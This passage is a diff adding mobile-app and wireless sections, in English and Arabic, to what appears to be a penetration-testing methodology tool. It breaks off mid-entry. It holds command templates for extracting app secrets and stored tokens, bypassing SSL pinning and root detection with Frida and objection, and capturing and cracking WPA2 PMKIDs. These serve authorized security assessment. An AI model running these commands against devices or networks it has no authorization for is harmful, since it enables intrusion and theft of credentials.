@@ -3108,5 +3108,1321 @@
         }
       }
     ]
+  },
+  {
+    "id": "mobile",
+    "label": {
+      "en": "Mobile Testing",
+      "ar": "اختبار التطبيقات المحمولة"
+    },
+    "short": {
+      "en": "Mobile",
+      "ar": "موبايل"
+    },
+    "icon": "📱",
+    "color": "#7c3aed",
+    "desc": {
+      "en": "iOS/Android app security — static analysis, dynamic analysis, SSL pinning bypass, API backend testing",
+      "ar": "أمان تطبيقات iOS/Android — تحليل ثابت، تحليل ديناميكي، تجاوز SSL Pinning"
+    },
+    "steps": [
+      {
+        "id": "mob1",
+        "title": {
+          "en": "Mobile App Recon & Setup",
+          "ar": "استطلاع التطبيق والإعداد"
+        },
+        "priority": "high",
+        "summary": {
+          "en": "Acquire the app, set up your analysis environment, and map the attack surface before touching any code.",
+          "ar": "احصل على التطبيق وجهّز بيئة التحليل وارسم خريطة سطح الهجوم قبل لمس أي كود."
+        },
+        "checklist": [
+          {
+            "en": "Download APK/IPA from app store or company MDM",
+            "ar": "تحميل APK/IPA من متجر التطبيقات أو MDM الشركة"
+          },
+          {
+            "en": "Extract APK: apktool d app.apk (Android) / unzip app.ipa (iOS)",
+            "ar": "استخراج APK: apktool d app.apk (Android) / unzip app.ipa (iOS)"
+          },
+          {
+            "en": "Identify app version, build number, minimum OS requirements",
+            "ar": "تحديد إصدار التطبيق ورقم البناء ومتطلبات الحد الأدنى لنظام التشغيل"
+          },
+          {
+            "en": "Review AndroidManifest.xml / Info.plist for exported components and permissions",
+            "ar": "مراجعة AndroidManifest.xml / Info.plist للمكوّنات المُصدَّرة والصلاحيات"
+          },
+          {
+            "en": "Map all network endpoints from strings/config files",
+            "ar": "رسم خريطة لجميع نقاط النهاية الشبكية من السلاسل/ملفات الإعداد"
+          },
+          {
+            "en": "Check for debug builds, test credentials, or dev endpoints",
+            "ar": "التحقق من وجود بنيات تصحيح أو بيانات اعتماد تجريبية أو نقاط نهاية تطوير"
+          },
+          {
+            "en": "Set up Android emulator (Genymotion) or jailbroken/rooted test device",
+            "ar": "إعداد محاكي Android (Genymotion) أو جهاز اختبار مكسور/روت"
+          },
+          {
+            "en": "Configure Burp Suite proxy with Portswigger CA cert installed on device",
+            "ar": "تهيئة وكيل Burp Suite مع تثبيت شهادة CA من Portswigger على الجهاز"
+          }
+        ],
+        "commands": [
+          {
+            "id": "mob1c1",
+            "title": {
+              "en": "APK Extraction & Manifest Analysis",
+              "ar": "استخراج APK وتحليل Manifest"
+            },
+            "purpose": {
+              "en": "Decompile APK and review manifest for exported components and dangerous permissions",
+              "ar": "تفكيك APK ومراجعة Manifest للمكوّنات المُصدَّرة والصلاحيات الخطرة"
+            },
+            "cmd": "# Decompile APK:\napktool d {APP}.apk -o {APP}_decompiled/\n\n# Review manifest (critical reading):\ncat {APP}_decompiled/AndroidManifest.xml | grep -E 'exported|permission|debuggable|allowBackup'\n\n# Decompile to Java (readable code):\njadx -d {APP}_jadx/ {APP}.apk\n\n# Quick win: grep for hardcoded secrets:\ngrep -rn --include='*.xml' --include='*.json' --include='*.java' \\\n  -E 'api_key|apikey|secret|password|token|endpoint' {APP}_jadx/ | grep -v '.class'",
+            "example": "apktool d com.acme.app.apk -o acme_decompiled/",
+            "flags": [
+              {
+                "f": "exported=\"true\"",
+                "d": {
+                  "en": "Component accessible to other apps — test for unauthorized access",
+                  "ar": "مكوّن متاح لتطبيقات أخرى — اختبر وصولاً غير مصرّح به"
+                }
+              },
+              {
+                "f": "android:debuggable=\"true\"",
+                "d": {
+                  "en": "Debug build — attach debugger, extract data trivially",
+                  "ar": "بنية تصحيح — ألصق مُصحِّح، استخرج البيانات ببساطة"
+                }
+              },
+              {
+                "f": "android:allowBackup=\"true\"",
+                "d": {
+                  "en": "adb backup extracts all app data without root",
+                  "ar": "adb backup يستخرج كل بيانات التطبيق بدون روت"
+                }
+              }
+            ],
+            "note": {
+              "en": "exported=\"true\" + no permission = any app on the device can call this component. Instant finding.",
+              "ar": "exported=\"true\" + بدون صلاحية = أي تطبيق على الجهاز يمكنه استدعاء هذا المكوّن. نتيجة فورية."
+            },
+            "out": {
+              "en": "Decompiled source tree + manifest vulnerabilities + hardcoded secrets list",
+              "ar": "شجرة كود مُفككَّ + ثغرات Manifest + قائمة الأسرار المُشفَّرة"
+            }
+          },
+          {
+            "id": "mob1c2",
+            "title": {
+              "en": "IPA Extraction & Binary Analysis (iOS)",
+              "ar": "استخراج IPA وتحليل الثنائي (iOS)"
+            },
+            "purpose": {
+              "en": "Extract and analyze iOS app binary for secrets, endpoints, and security controls",
+              "ar": "استخراج وتحليل ثنائي تطبيق iOS بحثاً عن الأسرار ونقاط النهاية وضوابط الأمان"
+            },
+            "cmd": "# Unpack IPA:\nunzip {APP}.ipa -d {APP}_ipa/\ncd {APP}_ipa/Payload/{APP}.app/\n\n# Check binary protections:\notool -hv {APP}          # architecture\ncodesign -dvvv {APP}     # entitlements\n\n# Grep binary for secrets (strings command):\nstrings {APP} | grep -E 'https://|api|key|secret|token|password' | head -50\n\n# Check for ATS exceptions (disables TLS enforcement):\ngrep -A5 'NSAppTransportSecurity' Info.plist",
+            "example": "strings ACMEApp.app/ACMEApp | grep -i 'api\\|key\\|secret'",
+            "flags": [
+              {
+                "f": "NSAllowsArbitraryLoads",
+                "d": {
+                  "en": "ATS disabled — no TLS enforcement at all",
+                  "ar": "ATS معطَّل — لا تطبيق للـTLS على الإطلاق"
+                }
+              },
+              {
+                "f": "get-task-allow",
+                "d": {
+                  "en": "Debuggable — allows debugger attachment on real device",
+                  "ar": "قابل للتصحيح — يسمح بإرفاق مُصحِّح على جهاز حقيقي"
+                }
+              },
+              {
+                "f": "com.apple.security.app-sandbox",
+                "d": {
+                  "en": "App sandbox present — good security signal",
+                  "ar": "Sandbox التطبيق موجود — إشارة أمنية جيدة"
+                }
+              }
+            ],
+            "note": {
+              "en": "Look for NSExceptionDomains — companies often disable TLS for specific domains, leaking endpoint list.",
+              "ar": "ابحث عن NSExceptionDomains — الشركات غالباً تعطّل TLS لنطاقات محددة، مما يكشف قائمة نقاط النهاية."
+            },
+            "out": {
+              "en": "Binary protections status + hardcoded endpoints/secrets + ATS configuration",
+              "ar": "حالة حمايات الثنائي + نقاط النهاية/الأسرار المُشفَّرة + تهيئة ATS"
+            }
+          }
+        ],
+        "tools": [
+          "apktool",
+          "jadx",
+          "objection",
+          "Burp Suite Pro"
+        ],
+        "deliverable": {
+          "en": "App attack surface map: endpoints, exported components, permissions, secrets found",
+          "ar": "خريطة سطح هجوم التطبيق: نقاط النهاية، المكوّنات المُصدَّرة، الصلاحيات، الأسرار المكتشفة"
+        },
+        "tip": {
+          "en": "Check firebase.google-services.json and google-services.json files in the APK. Firebase API keys scoped to specific apps often work globally for other Firebase projects if the rules are misconfigured.",
+          "ar": "تحقق من ملفات firebase.google-services.json وgoogle-services.json في APK. مفاتيح Firebase API المقيّدة بتطبيقات محددة غالباً تعمل على مشاريع Firebase أخرى إن كانت القواعد مُهيَّأة بشكل خاطئ."
+        }
+      },
+      {
+        "id": "mob2",
+        "title": {
+          "en": "Static Analysis — Code & Storage",
+          "ar": "التحليل الثابت — الكود والتخزين"
+        },
+        "priority": "high",
+        "summary": {
+          "en": "Audit decompiled source for vulnerabilities without running the app — zero noise, high precision.",
+          "ar": "تدقيق الكود المُفككَّ بحثاً عن الثغرات دون تشغيل التطبيق — صفر ضوضاء، دقة عالية."
+        },
+        "checklist": [
+          {
+            "en": "Scan for hardcoded secrets (API keys, passwords, private keys)",
+            "ar": "فحص الأسرار المُشفَّرة (مفاتيح API، كلمات مرور، مفاتيح خاصة)"
+          },
+          {
+            "en": "Review all HTTP/HTTPS endpoints for HTTP-only calls",
+            "ar": "مراجعة جميع نقاط نهاية HTTP/HTTPS بحثاً عن اتصالات HTTP فقط"
+          },
+          {
+            "en": "Check SharedPreferences / UserDefaults for sensitive data storage",
+            "ar": "فحص SharedPreferences / UserDefaults لتخزين البيانات الحساسة"
+          },
+          {
+            "en": "Identify SQLite databases and check for unencrypted sensitive data",
+            "ar": "تحديد قواعد بيانات SQLite والتحقق من عدم تشفير البيانات الحساسة"
+          },
+          {
+            "en": "Review cryptography: weak algorithms (DES, MD5, ECB mode), hardcoded IV/key",
+            "ar": "مراجعة التشفير: خوارزميات ضعيفة (DES، MD5، ECB)، IV/مفتاح مُشفَّر"
+          },
+          {
+            "en": "Check for insecure random number generation (Math.random for security purposes)",
+            "ar": "التحقق من توليد الأرقام العشوائية غير الآمن (Math.random لأغراض أمنية)"
+          },
+          {
+            "en": "Review exported content providers for SQL injection",
+            "ar": "مراجعة مزوّدي المحتوى المُصدَّرين بحثاً عن حقن SQL"
+          },
+          {
+            "en": "Check WebView configuration: JavaScript enabled, file access, universal access",
+            "ar": "فحص تهيئة WebView: JavaScript مُفعَّل، وصول للملفات، وصول عالمي"
+          }
+        ],
+        "commands": [
+          {
+            "id": "mob2c1",
+            "title": {
+              "en": "MobSF Automated Static Analysis",
+              "ar": "تحليل ثابت آلي مع MobSF"
+            },
+            "purpose": {
+              "en": "Automated security scan covering 100+ mobile-specific checks",
+              "ar": "فحص أمني آلي يغطي أكثر من 100 فحص خاص بالموبايل"
+            },
+            "cmd": "# Run MobSF via Docker (easiest):\ndocker pull opensecurity/mobile-security-framework-mobsf:latest\ndocker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest\n\n# Upload via API:\ncurl -F 'file=@{APP}.apk' http://localhost:8000/api/v1/upload \\\n  -H 'Authorization: {MOBSF_API_KEY}'\n\n# Manual complement — find WebView issues:\ngrep -rn 'setJavaScriptEnabled(true)\\|addJavascriptInterface\\|setAllowFileAccess' {APP}_jadx/",
+            "example": "docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf",
+            "flags": [
+              {
+                "f": "setJavaScriptEnabled(true)",
+                "d": {
+                  "en": "JS in WebView — check for XSS via deep links or injected content",
+                  "ar": "JS في WebView — تحقق من XSS عبر روابط عميقة أو محتوى مُحقون"
+                }
+              },
+              {
+                "f": "addJavascriptInterface",
+                "d": {
+                  "en": "JavaScript bridge to native code — RCE if WebView loads external content",
+                  "ar": "جسر JavaScript للكود الأصلي — RCE إن كان WebView يحمّل محتوى خارجي"
+                }
+              },
+              {
+                "f": "setAllowFileAccessFromFileURLs",
+                "d": {
+                  "en": "Local file theft via malicious HTML if combined with JS enabled",
+                  "ar": "سرقة ملف محلي عبر HTML خبيث إن اقترن مع JS مُفعَّل"
+                }
+              }
+            ],
+            "note": {
+              "en": "MobSF gives you a severity-sorted report in minutes. Use it as your baseline, then investigate red findings manually.",
+              "ar": "MobSF يعطيك تقريراً مُرتَّباً بالخطورة في دقائق. استخدمه كخط أساس، ثم حقّق يدوياً في النتائج الحمراء."
+            },
+            "out": {
+              "en": "Full static analysis report: CVSS scores, code locations, remediation",
+              "ar": "تقرير تحليل ثابت كامل: درجات CVSS، مواقع الكود، الإصلاح"
+            }
+          },
+          {
+            "id": "mob2c2",
+            "title": {
+              "en": "Sensitive Data in Storage",
+              "ar": "بيانات حساسة في التخزين"
+            },
+            "purpose": {
+              "en": "Find unencrypted sensitive data in app storage locations",
+              "ar": "إيجاد بيانات حساسة غير مشفَّرة في مواقع تخزين التطبيق"
+            },
+            "cmd": "# On rooted Android device / emulator:\nadb shell\nrun-as com.{PACKAGE_NAME}\n\n# Check SharedPreferences (often stores tokens!):\ncat /data/data/com.{PACKAGE_NAME}/shared_prefs/*.xml\n\n# Check SQLite databases:\nls /data/data/com.{PACKAGE_NAME}/databases/\nsqlite3 /data/data/com.{PACKAGE_NAME}/databases/{DB_NAME} \".tables\"\nsqlite3 /data/data/com.{PACKAGE_NAME}/databases/{DB_NAME} \"SELECT * FROM users;\"\n\n# iOS (jailbroken): check keychain and NSUserDefaults:\nfrida-ios-dump keychain\ncat /var/mobile/Containers/Data/Application/{UUID}/Library/Preferences/*.plist",
+            "example": "sqlite3 /data/data/com.acme.app/databases/app.db '.tables'",
+            "flags": [
+              {
+                "f": "run-as",
+                "d": {
+                  "en": "Access app data directory without root on debug builds",
+                  "ar": "الوصول لمجلد بيانات التطبيق بدون روت على بنيات التصحيح"
+                }
+              },
+              {
+                "f": "adb backup",
+                "d": {
+                  "en": "Extract full app data if allowBackup=true (no root required)",
+                  "ar": "استخراج كامل لبيانات التطبيق إن كان allowBackup=true (لا يتطلب روت)"
+                }
+              }
+            ],
+            "note": {
+              "en": "SharedPreferences are XML files, often store auth tokens. SQLite DBs frequently have no encryption. Both are trivial to read on a rooted device.",
+              "ar": "SharedPreferences ملفات XML غالباً تخزّن رموز المصادقة. قواعد بيانات SQLite كثيراً ما تخلو من التشفير. كلاهما سهل القراءة على جهاز مكسور."
+            },
+            "out": {
+              "en": "Sensitive data locations + content + encryption status",
+              "ar": "مواقع البيانات الحساسة + محتواها + حالة التشفير"
+            }
+          }
+        ],
+        "tools": [
+          "MobSF",
+          "apktool",
+          "jadx",
+          "adb",
+          "sqlite3"
+        ],
+        "deliverable": {
+          "en": "Static analysis report with code-level evidence for each finding",
+          "ar": "تقرير تحليل ثابت بأدلة على مستوى الكود لكل ثغرة"
+        },
+        "tip": {
+          "en": "Search specifically for \"MODE_WORLD_READABLE\" and \"MODE_WORLD_WRITEABLE\" in Android code — files created with these modes are readable by any app on the device. Classic information disclosure.",
+          "ar": "ابحث تحديداً عن \"MODE_WORLD_READABLE\" و\"MODE_WORLD_WRITEABLE\" في كود Android — الملفات المنشأة بهذين الوضعين قابلة للقراءة من أي تطبيق على الجهاز. إفصاح معلومات كلاسيكي."
+        }
+      },
+      {
+        "id": "mob3",
+        "title": {
+          "en": "Dynamic Analysis & Traffic Interception",
+          "ar": "التحليل الديناميكي واعتراض الحركة"
+        },
+        "priority": "critical",
+        "summary": {
+          "en": "Run the app and intercept all network traffic, bypass SSL pinning, and hook runtime behavior with Frida.",
+          "ar": "شغّل التطبيق واعترض كل حركة الشبكة، تجاوز SSL Pinning، وعدّل السلوك في وقت التشغيل باستخدام Frida."
+        },
+        "checklist": [
+          {
+            "en": "Configure Burp Suite proxy on device/emulator",
+            "ar": "تهيئة وكيل Burp Suite على الجهاز/المحاكي"
+          },
+          {
+            "en": "Install Burp CA certificate as system certificate (rooted device)",
+            "ar": "تثبيت شهادة CA من Burp كشهادة نظام (جهاز مكسور)"
+          },
+          {
+            "en": "Test SSL pinning bypass with Frida objection",
+            "ar": "اختبار تجاوز SSL Pinning مع Frida objection"
+          },
+          {
+            "en": "Capture and replay all API calls in Burp Repeater",
+            "ar": "التقاط وإعادة تشغيل جميع طلبات API في Burp Repeater"
+          },
+          {
+            "en": "Test authentication token handling: expiry, replay, logout invalidation",
+            "ar": "اختبار معالجة رمز المصادقة: انتهاء الصلاحية، الإعادة، إلغاء عند تسجيل الخروج"
+          },
+          {
+            "en": "Test all deep links for malicious input handling",
+            "ar": "اختبار جميع الروابط العميقة للتعامل مع المدخلات الخبيثة"
+          },
+          {
+            "en": "Check for sensitive data in request/response headers",
+            "ar": "التحقق من البيانات الحساسة في رؤوس الطلب/الاستجابة"
+          },
+          {
+            "en": "Test for debug endpoints accessible in production builds",
+            "ar": "اختبار نقاط النهاية التصحيحية المتاحة في بنيات الإنتاج"
+          },
+          {
+            "en": "Capture and analyze WebSocket traffic",
+            "ar": "التقاط وتحليل حركة WebSocket"
+          },
+          {
+            "en": "Test biometric authentication bypass",
+            "ar": "اختبار تجاوز المصادقة البيومترية"
+          }
+        ],
+        "commands": [
+          {
+            "id": "mob3c1",
+            "title": {
+              "en": "SSL Pinning Bypass with Objection + Frida",
+              "ar": "تجاوز SSL Pinning مع Objection + Frida"
+            },
+            "purpose": {
+              "en": "Intercept HTTPS traffic even when the app implements certificate pinning",
+              "ar": "اعتراض حركة HTTPS حتى عندما يُطبَّق SSL Pinning"
+            },
+            "cmd": "# Install Frida server on device (match device arch):\nadb push frida-server-{VERSION}-android-{ARCH} /data/local/tmp/frida-server\nadb shell chmod 755 /data/local/tmp/frida-server\nadb shell /data/local/tmp/frida-server &\n\n# Universal SSL pinning bypass with objection:\nobjection --gadget com.{PACKAGE_NAME} explore\n# Then inside objection:\n# android sslpinning disable\n# ios sslpinning disable (iOS)\n\n# If objection fails — Frida script:\nfrida -U -f com.{PACKAGE_NAME} \\\n  --codeshare sowdust/universal-android-ssl-pinning-bypass-2",
+            "example": "objection --gadget com.acme.banking explore",
+            "flags": [
+              {
+                "f": "android sslpinning disable",
+                "d": {
+                  "en": "Patches SSL pinning at runtime — 95% success on standard implementations",
+                  "ar": "يعدّل SSL Pinning في وقت التشغيل — نجاح 95% على التطبيقات القياسية"
+                }
+              },
+              {
+                "f": "--codeshare",
+                "d": {
+                  "en": "Use community Frida scripts — many bypass specific frameworks (OkHttp, conscrypt)",
+                  "ar": "استخدم سكربتات Frida المجتمعية — كثيرة منها تتجاوز إطارات محددة (OkHttp، conscrypt)"
+                }
+              },
+              {
+                "f": "-f",
+                "d": {
+                  "en": "Spawn the app fresh with Frida injected (more reliable than attaching)",
+                  "ar": "شغّل التطبيق من البداية مع Frida مُحقون (أكثر موثوقية من الإرفاق)"
+                }
+              }
+            ],
+            "note": {
+              "en": "If universal bypass fails: identify pinning library from jadx (OkHttp, TrustKit, custom), then use framework-specific bypass script.",
+              "ar": "إن فشل التجاوز العالمي: حدّد مكتبة الـpinning من jadx (OkHttp، TrustKit، مخصصة)، ثم استخدم سكربت تجاوز خاص بالإطار."
+            },
+            "out": {
+              "en": "Full HTTPS traffic visible in Burp Suite — treat app as a web target from here",
+              "ar": "كامل حركة HTTPS مرئية في Burp Suite — عامل التطبيق كهدف ويب من هنا"
+            }
+          },
+          {
+            "id": "mob3c2",
+            "title": {
+              "en": "Runtime Manipulation with Frida",
+              "ar": "التلاعب في وقت التشغيل مع Frida"
+            },
+            "purpose": {
+              "en": "Hook and modify app behavior at runtime: bypass auth, extract keys, dump memory",
+              "ar": "خطف وتعديل سلوك التطبيق في وقت التشغيل: تجاوز المصادقة، استخراج المفاتيح، تفريغ الذاكرة"
+            },
+            "cmd": "# Dump all classes (explore app structure):\nfrida -U com.{PACKAGE_NAME} -e \"Java.perform(function(){Java.enumerateLoadedClasses({onMatch:function(c){console.log(c)},onComplete:function(){}})});\"\n\n# Hook a specific method to log arguments and return value:\nfrida -U com.{PACKAGE_NAME} -e \"\nJava.perform(function() {\n  var {ClassName} = Java.use('{package}.{ClassName}');\n  {ClassName}.{methodName}.implementation = function(arg) {\n    console.log('[*] Called with: ' + arg);\n    var ret = this.{methodName}(arg);\n    console.log('[*] Returning: ' + ret);\n    return ret;\n  };\n});\"\n\n# Bypass root detection:\nobjection -g com.{PACKAGE_NAME} explore\n# > android root disable",
+            "example": "objection -g com.acme.app explore  # then: android root disable",
+            "flags": [
+              {
+                "f": "Java.use(className)",
+                "d": {
+                  "en": "Get a handle on any Java class loaded at runtime",
+                  "ar": "الحصول على مرجع لأي كلاس Java محمَّل في وقت التشغيل"
+                }
+              },
+              {
+                "f": ".implementation",
+                "d": {
+                  "en": "Replace a method's implementation entirely",
+                  "ar": "استبدال تطبيق طريقة بالكامل"
+                }
+              },
+              {
+                "f": "android root disable",
+                "d": {
+                  "en": "Objection: bypass most root detection checks in one command",
+                  "ar": "Objection: تجاوز معظم فحوصات كشف الروت بأمر واحد"
+                }
+              }
+            ],
+            "note": {
+              "en": "Use objection for 80% of tasks. Drop to raw Frida scripts when you need custom logic or the app has non-standard security.",
+              "ar": "استخدم objection لـ80% من المهام. انتقل لسكربتات Frida المخصصة عند الحاجة لمنطق مخصص أو عندما يمتلك التطبيق أماناً غير قياسي."
+            },
+            "out": {
+              "en": "Bypassed security controls + hooked method outputs + dumped secrets from memory",
+              "ar": "ضوابط أمان مُتجاوَزة + مخرجات الطرق المخطوفة + أسرار مُستخرَجة من الذاكرة"
+            }
+          }
+        ],
+        "tools": [
+          "Frida",
+          "objection",
+          "Burp Suite Pro",
+          "adb"
+        ],
+        "deliverable": {
+          "en": "Full API traffic capture + bypassed security controls + runtime findings",
+          "ar": "التقاط كامل لحركة API + تجاوز ضوابط الأمان + نتائج وقت التشغيل"
+        },
+        "tip": {
+          "en": "After SSL pinning bypass, immediately authenticate and capture the session token. Then test every API endpoint the app calls — mobile backends consistently have weaker authorization than web frontends because developers assume only the app can call them.",
+          "ar": "بعد تجاوز SSL Pinning، سجّل الدخول فوراً والتقط رمز الجلسة. ثم اختبر كل نقطة نهاية API يستدعيها التطبيق — خوادم تطبيقات الموبايل باستمرار تمتلك تفويضاً أضعف من واجهات الويب لأن المطوّرين يفترضون أن التطبيق فقط يمكنه استدعاءها."
+        }
+      }
+    ]
+  },
+  {
+    "id": "wireless",
+    "label": {
+      "en": "Wireless Testing",
+      "ar": "اختبار الشبكات اللاسلكية"
+    },
+    "short": {
+      "en": "Wireless",
+      "ar": "لاسلكي"
+    },
+    "icon": "📶",
+    "color": "#0284c7",
+    "desc": {
+      "en": "WPA2/WPA3 attacks, evil twin, PMKID, 802.1X — on-site wireless assessments",
+      "ar": "WPA2/WPA3، Evil Twin، PMKID، 802.1X — تقييم الشبكات اللاسلكية الميداني"
+    },
+    "steps": [
+      {
+        "id": "wl1",
+        "title": {
+          "en": "Wireless Recon & Survey",
+          "ar": "الاستطلاع والمسح اللاسلكي"
+        },
+        "priority": "high",
+        "summary": {
+          "en": "Passive mapping of all wireless networks, clients, and infrastructure before any active attacks.",
+          "ar": "رسم خريطة سلبية لجميع الشبكات اللاسلكية والعملاء والبنية التحتية قبل أي هجمات نشطة."
+        },
+        "checklist": [
+          {
+            "en": "Enable monitor mode on wireless adapter",
+            "ar": "تفعيل وضع المراقبة على محوّل الشبكة اللاسلكية"
+          },
+          {
+            "en": "Capture passive survey: all SSIDs, BSSIDs, channels, signal strength",
+            "ar": "التقاط مسح سلبي: جميع SSIDs وBSSIDs والقنوات وقوة الإشارة"
+          },
+          {
+            "en": "Identify target network security type: WPA2-PSK, WPA2-Enterprise, WPA3, Open",
+            "ar": "تحديد نوع أمان الشبكة المستهدفة: WPA2-PSK، WPA2-Enterprise، WPA3، مفتوحة"
+          },
+          {
+            "en": "Map all connected clients to target BSSID",
+            "ar": "رسم خريطة لجميع العملاء المتصلين بـBSSID المستهدف"
+          },
+          {
+            "en": "Identify hidden SSIDs via probe requests",
+            "ar": "تحديد SSIDs المخفية عبر طلبات المسح"
+          },
+          {
+            "en": "Check for guest networks and their isolation",
+            "ar": "فحص شبكات الضيوف وعزلها"
+          },
+          {
+            "en": "Identify rogue/unauthorized access points",
+            "ar": "تحديد نقاط الوصول المارقة/غير المصرّح بها"
+          },
+          {
+            "en": "Document 802.11 protocols in use: a/b/g/n/ac/ax",
+            "ar": "توثيق بروتوكولات 802.11 المستخدمة: a/b/g/n/ac/ax"
+          }
+        ],
+        "commands": [
+          {
+            "id": "wl1c1",
+            "title": {
+              "en": "Monitor Mode + Passive Survey",
+              "ar": "وضع المراقبة + المسح السلبي"
+            },
+            "purpose": {
+              "en": "Enable monitor mode and passively capture all wireless traffic and network metadata",
+              "ar": "تفعيل وضع المراقبة والتقاط سلبي لجميع حركة الشبكة اللاسلكية وبيانات الشبكات"
+            },
+            "cmd": "# Check adapter and enable monitor mode:\niwconfig\nip link set {INTERFACE} down\niwconfig {INTERFACE} mode monitor\nip link set {INTERFACE} up\n# OR with airmon-ng:\nairmon-ng check kill   # kill interfering processes first\nairmon-ng start {INTERFACE}\n\n# Passive survey — all networks:\nairodump-ng {INTERFACE}mon\n\n# Target specific network:\nairodump-ng -c {CHANNEL} --bssid {TARGET_BSSID} -w {CAPTURE_FILE} {INTERFACE}mon",
+            "example": "airmon-ng start wlan0 && airodump-ng wlan0mon",
+            "flags": [
+              {
+                "f": "-c",
+                "d": {
+                  "en": "Lock to specific channel (reduces noise, focuses capture)",
+                  "ar": "الإغلاق على قناة محددة (يقلل الضوضاء، يركّز الالتقاط)"
+                }
+              },
+              {
+                "f": "--bssid",
+                "d": {
+                  "en": "Filter capture to target AP only",
+                  "ar": "تصفية الالتقاط على AP مستهدف فقط"
+                }
+              },
+              {
+                "f": "-w",
+                "d": {
+                  "en": "Write capture to file for offline analysis",
+                  "ar": "كتابة الالتقاط لملف للتحليل بدون اتصال"
+                }
+              },
+              {
+                "f": "#STATION",
+                "d": {
+                  "en": "In airodump output: clients connected to the AP",
+                  "ar": "في مخرجات airodump: العملاء المتصلون بالـAP"
+                }
+              }
+            ],
+            "note": {
+              "en": "Recommended adapter: Alfa AWUS036ACH or AWUS036NHA. Built-in adapters rarely support monitor mode properly.",
+              "ar": "المحوّل الموصى به: Alfa AWUS036ACH أو AWUS036NHA. المحوّلات المدمجة نادراً ما تدعم وضع المراقبة بشكل صحيح."
+            },
+            "out": {
+              "en": "Full wireless network map: SSID, BSSID, channel, encryption, connected clients, signal strength",
+              "ar": "خريطة شبكات لاسلكية كاملة: SSID، BSSID، قناة، تشفير، عملاء متصلون، قوة إشارة"
+            }
+          }
+        ],
+        "tools": [
+          "aircrack-ng",
+          "Alfa AWUS036ACH adapter"
+        ],
+        "deliverable": {
+          "en": "Wireless network inventory with security types and client associations",
+          "ar": "جرد الشبكات اللاسلكية مع أنواع الأمان وجمعيات العملاء"
+        },
+        "tip": {
+          "en": "Run the survey from the parking lot and building perimeter first. Signal bleed often reveals internal SSIDs and rogue APs not visible from the reception desk.",
+          "ar": "ابدأ المسح من مواقف السيارات ومحيط المبنى أولاً. تسرّب الإشارة غالباً يكشف عن SSIDs داخلية ونقاط وصول مارقة غير مرئية من مكتب الاستقبال."
+        }
+      },
+      {
+        "id": "wl2",
+        "title": {
+          "en": "WPA2 PSK Attacks",
+          "ar": "هجمات WPA2 PSK"
+        },
+        "priority": "critical",
+        "summary": {
+          "en": "Capture 4-way handshake or PMKID, then crack offline. Zero interaction with the network during cracking.",
+          "ar": "التقاط 4-Way Handshake أو PMKID، ثم الكسر بدون اتصال. صفر تفاعل مع الشبكة أثناء الكسر."
+        },
+        "checklist": [
+          {
+            "en": "Attempt PMKID capture (no client needed, instant)",
+            "ar": "محاولة التقاط PMKID (لا يحتاج عميلاً، فوري)"
+          },
+          {
+            "en": "Capture 4-way handshake via deauth or wait for natural connection",
+            "ar": "التقاط 4-Way Handshake عبر deauth أو انتظار اتصال طبيعي"
+          },
+          {
+            "en": "Verify handshake quality with aircrack-ng",
+            "ar": "التحقق من جودة Handshake مع aircrack-ng"
+          },
+          {
+            "en": "Dictionary attack with rockyou + company-specific wordlist",
+            "ar": "هجوم قاموسي مع rockyou + قائمة كلمات خاصة بالشركة"
+          },
+          {
+            "en": "Rule-based attack with hashcat rules (best64, d3ad0ne)",
+            "ar": "هجوم قائم على القواعد مع قواعد hashcat (best64، d3ad0ne)"
+          },
+          {
+            "en": "PRINCE attack for intelligent wordlist generation",
+            "ar": "هجوم PRINCE لتوليد قوائم كلمات ذكية"
+          },
+          {
+            "en": "Document cracking time and GPU used for client risk context",
+            "ar": "توثيق وقت الكسر وGPU المستخدم لسياق المخاطر للعميل"
+          }
+        ],
+        "commands": [
+          {
+            "id": "wl2c1",
+            "title": {
+              "en": "PMKID Capture (No Client Required)",
+              "ar": "التقاط PMKID (لا يحتاج عميلاً)"
+            },
+            "purpose": {
+              "en": "Extract PMKID directly from AP — no deauth, no waiting for clients",
+              "ar": "استخراج PMKID مباشرة من AP — دون deauth، دون انتظار عملاء"
+            },
+            "cmd": "# Install hcxtools:\napt install hcxdumptool hcxtools -y\n\n# Capture PMKID (works on most modern APs):\nhcxdumptool -o {CAPTURE}.pcapng -i {INTERFACE}mon \\\n  --enable_status=1 --filterlist_ap={TARGET_BSSID_FILE}\n\n# Convert to hashcat format:\nhcxpcapngtool -o {CAPTURE}.hc22000 {CAPTURE}.pcapng\n\n# Crack with hashcat:\nhashcat -m 22000 {CAPTURE}.hc22000 /usr/share/wordlists/rockyou.txt \\\n  -r /usr/share/hashcat/rules/best64.rule --force",
+            "example": "hcxdumptool -o capture.pcapng -i wlan0mon && hcxpcapngtool -o hash.hc22000 capture.pcapng",
+            "flags": [
+              {
+                "f": "-m 22000",
+                "d": {
+                  "en": "Hashcat: WPA-PBKDF2-PMKID+EAPOL (combined WPA2 mode)",
+                  "ar": "Hashcat: WPA-PBKDF2-PMKID+EAPOL (وضع WPA2 المدمج)"
+                }
+              },
+              {
+                "f": "-r best64.rule",
+                "d": {
+                  "en": "Apply 64 best password rules (append numbers, capitalize, etc.)",
+                  "ar": "تطبيق 64 أفضل قواعد كلمات المرور (إلحاق أرقام، تكبير، إلخ)"
+                }
+              },
+              {
+                "f": "--enable_status=1",
+                "d": {
+                  "en": "hcxdumptool: print status messages",
+                  "ar": "hcxdumptool: طباعة رسائل الحالة"
+                }
+              }
+            ],
+            "note": {
+              "en": "PMKID is calculated from: PMK + 'PMK Name' + AP_MAC + STA_MAC. If the AP broadcasts it (most do), you never need a connected client.",
+              "ar": "PMKID تُحسَب من: PMK + \"PMK Name\" + AP_MAC + STA_MAC. إن أرسلها AP (معظمها يرسلها)، لا تحتاج عميلاً متصلاً."
+            },
+            "out": {
+              "en": "Cracked PSK or proof of attack with crack time estimate",
+              "ar": "WPA2 passphrase مكسورة أو دليل الهجوم مع تقدير وقت الكسر"
+            }
+          },
+          {
+            "id": "wl2c2",
+            "title": {
+              "en": "4-Way Handshake Capture + Deauth",
+              "ar": "التقاط 4-Way Handshake + Deauth"
+            },
+            "purpose": {
+              "en": "Force clients to re-authenticate to capture the handshake",
+              "ar": "إجبار العملاء على إعادة المصادقة لالتقاط Handshake"
+            },
